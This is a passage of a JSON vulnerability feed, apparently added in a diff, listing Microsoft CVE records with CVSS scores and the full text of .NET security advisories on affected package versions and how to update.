kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2024-38167]( https://vulners.com/cve/CVE-2024-38167)\n\n### Revisions\n\nV1.0 (August 13, 2024): Advisory published.\n\n_Version 1.0_\n\n_Last Updated 2024-08-13_",
+            "modified": "2024-08-17T08:12:09",
+            "id": "OSV:GHSA-3R34-R6W3-FQP6",
+            "published": "2024-08-13T19:26:10",
+            "href": "https://osv.dev/vulnerability/GHSA-3r34-r6w3-fqp6",
+            "type": "osv",
+            "title": "Microsoft Security Advisory CVE-2024-38167 | .NET Information Disclosure Vulnerability",
+            "cvss": {
+                "score": 6.5,
+                "severity": "MEDIUM",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/osv/OSV:GHSA-3R34-R6W3-FQP6"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:41",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-38210"
+            ],
+            "description": "Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability",
+            "modified": "2024-08-29T21:52:08",
+            "id": "NVD:CVE-2024-38210",
+            "published": "2024-08-22T23:15:07",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-38210",
+            "type": "nvd",
+            "title": "CVE-2024-38210",
+            "vulnStatus": "Analyzed",
+            "cvss": {
+                "score": 7.8,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-38210"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:40",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2023-35352"
+            ],
+            "description": "Windows Remote Desktop Security Feature Bypass Vulnerability",
+            "modified": "2024-08-29T20:35:12",
+            "id": "NVD:CVE-2023-35352",
+            "published": "2023-07-11T18:15:19",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-35352",
+            "type": "nvd",
+            "title": "CVE-2023-35352",
+            "vulnStatus": "Modified",
+            "cvss": {
+                "score": 7.5,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2023-35352"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:41",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-38219"
+            ],
+            "description": "Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability",
+            "modified": "2024-08-29T14:45:17",
+            "id": "NVD:CVE-2024-38219",
+            "published": "2024-08-12T13:38:24",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-38219",
+            "type": "nvd",
+            "title": "CVE-2024-38219",
+            "vulnStatus": "Analyzed",
+            "cvss": {
+                "score": 9.0,
+                "severity": "CRITICAL",
+                "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-38219"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:41",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-38208"
+            ],
+            "description": "Microsoft Edge for Android Spoofing Vulnerability",
+            "modified": "2024-08-29T21:53:38",
+            "id": "NVD:CVE-2024-38208",
+            "published": "2024-08-22T23:15:07",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-38208",
+            "type": "nvd",
+            "title": "CVE-2024-38208",
+            "vulnStatus": "Analyzed",
+            "cvss": {
+                "score": 6.1,
+                "severity": "MEDIUM",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-38208"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:41",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-37325"
+            ],
+            "description": "Azure Science Virtual Machine (DSVM) Elevation of Privilege Vulnerability",
+            "modified": "2024-08-28T21:29:34",
+            "id": "NVD:CVE-2024-37325",
+            "published": "2024-06-11T17:16:04",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-37325",
+            "type": "nvd",
+            "title": "CVE-2024-37325",
+            "vulnStatus": "Analyzed",
+            "cvss": {
+                "score": 8.1,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-37325"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:41",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-43472"
+            ],
+            "description": "Microsoft Edge (Chromium-based) Elevation of Privilege Vulnerability",
+            "modified": "2024-08-28T19:13:21",
+            "id": "NVD:CVE-2024-43472",
+            "published": "2024-08-16T20:15:13",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-43472",
+            "type": "nvd",
+            "title": "CVE-2024-43472",
+            "vulnStatus": "Analyzed",
+            "cvss": {
+                "score": 8.3,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-43472"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:41",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-38209"
+            ],
+            "description": "Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability",
+            "modified": "2024-08-29T21:52:19",
+            "id": "NVD:CVE-2024-38209",
+            "published": "2024-08-22T23:15:07",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-38209",
+            "type": "nvd",
+            "title": "CVE-2024-38209",
+            "vulnStatus": "Analyzed",
+            "cvss": {
+                "score": 7.8,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-38209"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:27",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-38207"
+            ],
+            "description": "Microsoft Edge (HTML-based) Memory Corruption Vulnerability",
+            "modified": "2024-08-27T14:50:40",
+            "id": "NVD:CVE-2024-38207",
+            "published": "2024-08-23T23:15:08",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-38207",
+            "type": "nvd",
+            "title": "CVE-2024-38207",
+            "vulnStatus": "Analyzed",
+            "cvss": {
+                "score": 6.3,
+                "severity": "MEDIUM",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-38207"
+        },
+        {
+            "lastseen": "2024-08-16T12:14:30",
+            "bulletinFamily": "software",
+            "cvelist": [
+                "CVE-2024-30105"
+            ],
+            "description": "# Microsoft Security Advisory CVE-2024-30105 | .NET Denial of Service Vulnerability\n\n## <a name=\"executive-summary\"></a>Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in  .NET 8.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nA vulnerability exists in .NET when calling the JsonSerializer.DeserializeAsyncEnumerable method against an untrusted input using System.Text.Json may result in Denial of Service.\n\n## Discussion\n\nDiscussion for this issue can be found at  https://github.com/dotnet/runtime/issues/104619\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nMicrosoft has not identified any mitigating factors for this vulnerability.\n\n## <a name=\"affected-software\"></a>Affected software\n\n* Any .NET 8.0 application running on .NET 8.0.6 or earlier.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET Core project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 8\"></a>.NET 8\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[System.Text.Json](https://www.nuget.org/packages/System.Text.Json)               | >= 7.0.0, < =8.0.3 | 8.0.4\n\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 . If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspAspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspAspNetCore.App]\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.7  Runtime or .NET 8.0.107 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n\n.NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 7.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnet/. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2024-30105]( https://vulners.com/cve/CVE-2024-30105)\n\n### Revisions\n\nV1.0 (July 09, 2024): Advisory published.\n\n_Version 1.0_\n\n_Last Updated 2024-07-09_",
+            "modified": "2024-08-09T05:01:46",
+            "id": "GHSA-HH2W-P6RV-4G7W",
+            "published": "2024-07-09T21:14:10",
+            "href": "https://github.com/advisories/GHSA-hh2w-p6rv-4g7w",
+            "type": "github",
+            "title": "Microsoft Security Advisory CVE-2024-30105 | .NET Denial of Service Vulnerability",
+            "cvss": {
+                "score": 7.5,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/github/GHSA-HH2W-P6RV-4G7W"
+        },
+        {
+            "lastseen": "2024-08-16T12:14:23",
+            "bulletinFamily": "software",
+            "cvelist": [
+                "CVE-2024-38167"
+            ],
+            "description": "# Microsoft Security Advisory CVE-2024-38167 | .NET Information Disclosure Vulnerability\n\n## <a name=\"executive-summary\"></a>Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in  .NET 8.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nA vulnerability exists in .NET runtime TlsStream which may result in Information Disclosure.\n\n## Discussion\n\nDiscussion for this issue can be found at  https://github.com/dotnet/runtime/issues/106359\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nMicrosoft has not identified any mitigating factors for this vulnerability.\n\n## <a name=\"affected-software\"></a>Affected software\n\n* Any .NET 8.0 application running on .NET 8.0.7 or earlier.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET Core project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 8\"></a>.NET 8\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[Microsoft.NetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-arm)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-arm64)           | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-musl-arm)     | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-musl-arm64) | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-musl-x64)     | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-x64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.osx-arm64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.osx-x64)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-arm](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-arm)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-arm64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-x64)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-x86)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n\n\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspAspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspAspNetCore.App]\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.8  Runtime or .NET 8.0.108 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n\n.NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnet/. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2024-38167]( https://vulners.com/cve/CVE-2024-38167)\n\n### Revisions\n\nV1.0 (August 13, 2024): Advisory published.\n\n_Version 1.0_\n\n_Last Updated 2024-08-13_",
+            "modified": "2024-08-13T19:26:13",
+            "id": "GHSA-3R34-R6W3-FQP6",
+            "published": "2024-08-13T19:26:10",
+            "href": "https://github.com/advisories/GHSA-3r34-r6w3-fqp6",
+            "type": "github",
+            "title": "Microsoft Security Advisory CVE-2024-38167 | .NET Information Disclosure Vulnerability",
+            "cvss": {
+                "score": 6.5,
+                "severity": "MEDIUM",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/github/GHSA-3R34-R6W3-FQP6"
+        },
+        {
+            "lastseen": "2024-08-30T10:11:41",
+            "bulletinFamily": "cve",
+            "cvelist": [
+                "CVE-2024-43477"
+            ],
+            "description": "Improper access control in Decentralized Identity Services allows an unathenticated attacker to disable Verifiable ID's on another tenant.",
+            "modified": "2024-08-23T16:18:28",
+            "id": "NVD:CVE-2024-43477",
+            "published": "2024-08-23T02:15:07",
+            "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-43477",
+            "type": "nvd",
+            "title": "CVE-2024-43477",
+            "vulnStatus": "Awaiting Analysis",
+            "cvss": {
+                "score": 7.5,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/nvd/NVD:CVE-2024-43477"
+        }
+    ]
+}
